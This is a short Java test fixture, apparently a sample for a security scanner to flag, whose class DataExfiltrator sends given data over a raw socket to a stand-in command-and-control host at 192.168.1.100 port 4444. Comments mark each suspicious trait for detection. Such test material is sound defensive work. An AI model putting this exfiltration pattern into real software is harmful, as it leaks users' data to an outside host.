package org.example.test;

import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class DataExfiltrator {

    // This method should be flagged for making a raw socket connection.
    public void sendDataToC2Server(String data) {
        // C2 stands for "Command and Control".
        String c2ServerIp = "192.168.1.100"; // A hardcoded IP is suspicious.
        int c2ServerPort = 4444; // Common malware port.

        // The try-with-resources statement uses a forbidden class.
        try (Socket socket = new Socket(c2ServerIp, c2ServerPort);
             OutputStream output = socket.getOutputStream()) {

            // Send the exfiltrated data.
            output.write(data.getBytes(StandardCharsets.UTF_8));

        } catch (Exception e) {
            // Malware often hides exceptions or has minimal error handling.
        }
    }
}